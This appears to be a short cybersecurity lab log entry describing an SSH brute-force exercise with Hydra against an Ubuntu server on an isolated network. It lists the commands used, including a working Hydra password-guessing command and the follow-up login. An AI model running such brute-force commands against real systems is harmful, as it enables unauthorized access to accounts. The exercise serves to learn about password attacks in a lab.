# Day 5 – SSH Brute Force with Hydra

## Goal
Perform SSH brute force in a controlled cybersecurity lab to understand password attacks and authentication behavior.

## Lab Setup
- Attacker: Kali Linux (192.168.x.x)
- Target: Ubuntu Server (192.168.x.x)
- Network: Host-only (isolated)

## Commands Used
```bash
ip a
ping 192.168.x.x
nano creds.txt
hydra -l ubuntu -P creds.txt ssh://192.168.x.x -t 4 -V
ssh ubuntu@192.168.x.x
whoami && hostname && ip a
